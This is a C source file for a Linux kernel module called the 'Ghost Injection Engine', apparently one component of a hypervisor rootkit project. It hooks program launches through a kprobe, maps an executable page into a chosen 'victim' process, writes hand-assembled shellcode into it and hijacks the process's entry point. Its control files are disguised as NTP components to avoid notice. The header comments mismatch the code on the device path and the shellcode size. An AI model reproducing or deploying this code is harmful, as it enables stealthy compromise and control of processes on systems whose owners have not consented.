/* SPDX-License-Identifier: GPL-2.0-only
 *
 * svm_ghost.c — Ghost Injection Engine (Phase 2: Full Shellcode Injection)
 *
 * Hooks finalize_exec() via kprobe to detect target binary launch.
 * Schedules a task_work callback (TWA_RESUME) that fires just before
 * the process returns to userspace — at that point regs->ip is the
 * real ELF entry point and we can safely call vm_mmap().
 *
 * The callback:
 *   1. Maps an executable page into the victim's address space
 *   2. Copies a 85-byte shellcode that does:
 *        open("/dev/svm_monitor") → ioctl(0x5301) → close → jmp orig_entry
 *   3. Redirects regs->ip to the shellcode
 *
 * Result: victim wakes in userspace, runs our shellcode first (enters the
 * Matrix via ioctl), then jumps to its real _start. Zero ptrace footprint.
 */

#include "ring_minus_one.h"
#include <linux/binfmts.h>
#include <linux/kprobes.h>
#include <linux/mman.h>
#include <linux/task_work.h>

#define GHOST_TARGET_MAX 64

/* ── Resolve task_work_add (not exported to modules) ─────────────────────
 * Same kprobe trick used in svm_engine.c for set_memory_x/nx.
 */
typedef int (*task_work_add_t)(struct task_struct *, struct callback_head *,
                               enum task_work_notify_mode);
static task_work_add_t my_task_work_add;

static int resolve_task_work_add(void) {
  struct kprobe kp = {.symbol_name = "task_work_add"};
  int ret = register_kprobe(&kp);

  if (ret < 0)
    return ret;
  my_task_work_add = (task_work_add_t)kp.addr;
  unregister_kprobe(&kp);
  return 0;
}

/* ── State ───────────────────────────────────────────────────────────────── */

static char ghost_target[GHOST_TARGET_MAX];
static pid_t ghost_victim_pid;
static u64 ghost_original_rip;
static u64 ghost_shellcode_va;
static atomic_t ghost_armed = ATOMIC_INIT(0);
static atomic_t ghost_injected = ATOMIC_INIT(0); /* one-shot guard */

static struct proc_dir_entry *ghost_proc_entry;

/* ── Shellcode Template (x86_64, 85 bytes) ───────────────────────────────
 *
 * open("/dev/ntp_sync", O_RDWR) → ioctl(fd, 0x5301) → close(fd)
 *   → movabs rax, <ORIGINAL_ENTRY>; jmp rax
 *
 * The 8-byte original entry point sits at offset 0x3A (inside movabs).
 * ──────────────────────────────────────────────────────────────────────── */

static const u8 ghost_sc_template[] = {
    /* 0x00: lea rdi, [rip+0x3D]        → devpath string           */
    0x48,
    0x8d,
    0x3d,
    0x3d,
    0x00,
    0x00,
    0x00,
    /* 0x07: mov eax, 2                 → __NR_open                */
    0xb8,
    0x02,
    0x00,
    0x00,
    0x00,
    /* 0x0C: mov esi, 2                 → O_RDWR                   */
    0xbe,
    0x02,
    0x00,
    0x00,
    0x00,
    /* 0x11: xor edx, edx               → mode=0                   */
    0x31,
    0xd2,
    /* 0x13: syscall                                                */
    0x0f,
    0x05,
    /* 0x15: mov r15, rax               → save fd                  */
    0x49,
    0x89,
    0xc7,
    /* 0x18: test rax, rax              → check open success       */
    0x48,
    0x85,
    0xc0,
    /* 0x1B: js +0x1B                   → skip to jmp on failure   */
    0x78,
    0x1b,
    /* 0x1D: mov rdi, r15               → fd                       */
    0x4c,
    0x89,
    0xff,
    /* 0x20: mov eax, 16                → __NR_ioctl               */
    0xb8,
    0x10,
    0x00,
    0x00,
    0x00,
    /* 0x25: mov esi, 0x5301            → SVM_IOCTL_ENTER_MATRIX   */
    0xbe,
    0x01,
    0x53,
    0x00,
    0x00,
    /* 0x2A: xor edx, edx                                          */
    0x31,
    0xd2,
    /* 0x2C: syscall                                                */
    0x0f,
    0x05,
    /* 0x2E: mov rdi, r15               → fd for close             */
    0x4c,
    0x89,
    0xff,
    /* 0x31: mov eax, 3                 → __NR_close               */
    0xb8,
    0x03,
    0x00,
    0x00,
    0x00,
    /* 0x36: syscall                                                */
    0x0f,
    0x05,
    /* 0x38: movabs rax, PLACEHOLDER    → original entry point     */
    0x48,
    0xb8,
    0x41,
    0x41,
    0x41,
    0x41,
    0x41,
    0x41,
    0x41,
    0x41,
    /* 0x42: jmp rax                                                */
    0xff,
    0xe0,
    /* 0x44: "/dev/ntp_sync\0" (14 bytes) */
    '/',
    'd',
    'e',
    'v',
    '/',
    'n',
    't',
    'p',
    '_',
    's',
    'y',
    'n',
    'c',
    '\0',
};

#define GHOST_SC_SIZE sizeof(ghost_sc_template)
#define GHOST_SC_RIP_OFF 0x3A /* byte offset of the 8-byte imm in movabs */

/* ── Task-Work Callback (runs in full process context, CAN sleep) ──────── */

struct ghost_work {
  struct callback_head twork;
};

static void ghost_inject_callback(struct callback_head *head) {
  struct ghost_work *gw = container_of(head, struct ghost_work, twork);
  struct pt_regs *uregs = current_pt_regs();
  unsigned long sc_addr;
  u8 sc_buf[128];
  u64 orig_rip;

  orig_rip = uregs->ip; /* NOW this is the real ELF entry point */

  /* 1. Map an anonymous RWX page into the victim */
  sc_addr = vm_mmap(NULL, 0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_PRIVATE | MAP_ANONYMOUS, 0);
  if (IS_ERR_VALUE(sc_addr)) {
    pr_err("[GHOST] vm_mmap failed for PID %d (err %ld)\n", current->pid,
           (long)sc_addr);
    atomic_set(&ghost_injected, 0);
    kfree(gw);
    return;
  }

  /* 2. Build shellcode: template + patch original RIP */
  memcpy(sc_buf, ghost_sc_template, GHOST_SC_SIZE);
  memcpy(sc_buf + GHOST_SC_RIP_OFF, &orig_rip, sizeof(orig_rip));

  /* 3. Copy shellcode into victim's new page */
  if (copy_to_user((void __user *)sc_addr, sc_buf, GHOST_SC_SIZE)) {
    pr_err("[GHOST] copy_to_user failed for PID %d\n", current->pid);
    vm_munmap(sc_addr, PAGE_SIZE);
    atomic_set(&ghost_injected, 0);
    kfree(gw);
    return;
  }

  /* 4. Hijack: process will wake at our shellcode, not _start */
  ghost_original_rip = orig_rip;
  ghost_shellcode_va = sc_addr;
  ghost_victim_pid = current->pid;
  uregs->ip = sc_addr;

  pr_info("[GHOST] === INJECTION COMPLETE ===\n");
  pr_info("[GHOST]   PID       : %d (%s)\n", current->pid, current->comm);
  pr_info("[GHOST]   Orig Entry: 0x%llx\n", orig_rip);
  pr_info("[GHOST]   Shellcode : 0x%lx (%zu bytes)\n", sc_addr, GHOST_SC_SIZE);
  pr_info("[GHOST]   Flow: open->ioctl(0x5301)->close->jmp 0x%llx\n", orig_rip);
  pr_info("[GHOST] ============================\n");

  kfree(gw);
}

/* ── Kprobe on finalize_exec (detects target, schedules injection) ─────── */

static int ghost_pre_handler(struct kprobe *p, struct pt_regs *regs) {
  struct linux_binprm *bprm;
  struct ghost_work *gw;
  const char *basename;

  if (!ghost_target[0])
    return 0;

  /* One-shot: don't inject twice */
  if (atomic_read(&ghost_injected))
    return 0;

  bprm = (struct linux_binprm *)regs->di;
  if (!bprm || !bprm->filename)
    return 0;

  basename = strrchr(bprm->filename, '/');
  basename = basename ? basename + 1 : bprm->filename;

  if (strcmp(basename, ghost_target) != 0 &&
      strcmp(current->comm, ghost_target) != 0)
    return 0;

  /* ── TARGET ACQUIRED ── */
  if (atomic_cmpxchg(&ghost_injected, 0, 1) != 0)
    return 0;

  atomic_set(&ghost_armed, 1);

  gw = kmalloc(sizeof(*gw), GFP_ATOMIC);
  if (!gw) {
    pr_err("[GHOST] kmalloc failed, injection aborted\n");
    atomic_set(&ghost_injected, 0);
    return 0;
  }

  init_task_work(&gw->twork, ghost_inject_callback);

  if (my_task_work_add(current, &gw->twork, TWA_RESUME)) {
    pr_err("[GHOST] task_work_add failed\n");
    kfree(gw);
    atomic_set(&ghost_injected, 0);
    return 0;
  }

  pr_info("[GHOST] Target '%s' (PID %d) detected! Injection scheduled.\n",
          bprm->filename, current->pid);

  return 0;
}

static struct kprobe ghost_kp = {
    .symbol_name = "finalize_exec",
    .pre_handler = ghost_pre_handler,
};

/* ── Procfs: /proc/ntpd_policy ───────────────────────────────────────────
 *   write: set target name (resets one-shot flag)
 *   read:  show armed/injection status
 * ──────────────────────────────────────────────────────────────────────── */

static ssize_t ghost_proc_write(struct file *file, const char __user *buf,
                                size_t count, loff_t *ppos) {
  size_t len;

  if (count >= GHOST_TARGET_MAX)
    return -EINVAL;

  memset(ghost_target, 0, sizeof(ghost_target));
  if (copy_from_user(ghost_target, buf, count))
    return -EFAULT;

  len = strlen(ghost_target);
  while (len > 0 &&
         (ghost_target[len - 1] == '\n' || ghost_target[len - 1] == '\r'))
    ghost_target[--len] = '\0';

  /* Reset one-shot so a new target can be injected */
  atomic_set(&ghost_injected, 0);
  atomic_set(&ghost_armed, 0);
  ghost_victim_pid = 0;
  ghost_original_rip = 0;
  ghost_shellcode_va = 0;

  if (ghost_target[0])
    pr_info("[GHOST] Target armed: '%s'\n", ghost_target);
  else
    pr_info("[GHOST] Target disarmed.\n");

  return count;
}

static ssize_t ghost_proc_read(struct file *file, char __user *buf,
                               size_t count, loff_t *ppos) {
  char tmp[320];
  int len;

  len = snprintf(tmp, sizeof(tmp),
                 "Target    : %s\n"
                 "Armed     : %s\n"
                 "Injected  : %s\n"
                 "Victim PID: %d\n"
                 "Orig Entry: 0x%llx\n"
                 "Shellcode : 0x%llx\n",
                 ghost_target[0] ? ghost_target : "(none)",
                 atomic_read(&ghost_armed) ? "YES" : "NO",
                 atomic_read(&ghost_injected) ? "YES" : "NO", ghost_victim_pid,
                 ghost_original_rip, ghost_shellcode_va);

  return simple_read_from_buffer(buf, count, ppos, tmp, len);
}

static const struct proc_ops ghost_pops = {
    .proc_read = ghost_proc_read,
    .proc_write = ghost_proc_write,
};

/* ── Lifecycle ───────────────────────────────────────────────────────────── */

int svm_ghost_init(void) {
  int ret;

  ghost_target[0] = '\0';
  ghost_victim_pid = 0;
  ghost_original_rip = 0;
  ghost_shellcode_va = 0;

  ret = resolve_task_work_add();
  if (ret < 0) {
    pr_err("[GHOST] Cannot resolve task_work_add (%d)\n", ret);
    return ret;
  }

  ret = register_kprobe(&ghost_kp);
  if (ret < 0) {
    pr_err("[GHOST] kprobe on '%s' failed (%d)\n", ghost_kp.symbol_name, ret);
    return ret;
  }

  ghost_proc_entry = proc_create("ntpd_policy", 0600, NULL, &ghost_pops);
  if (!ghost_proc_entry) {
    unregister_kprobe(&ghost_kp);
    return -ENOMEM;
  }

  pr_info("[GHOST] Engine armed on '%s' @ %px | /proc/ntpd_policy ready\n",
          ghost_kp.symbol_name, ghost_kp.addr);
  return 0;
}

void svm_ghost_exit(void) {
  if (ghost_proc_entry)
    proc_remove(ghost_proc_entry);
  unregister_kprobe(&ghost_kp);
  pr_info("[GHOST] Engine disarmed.\n");
}
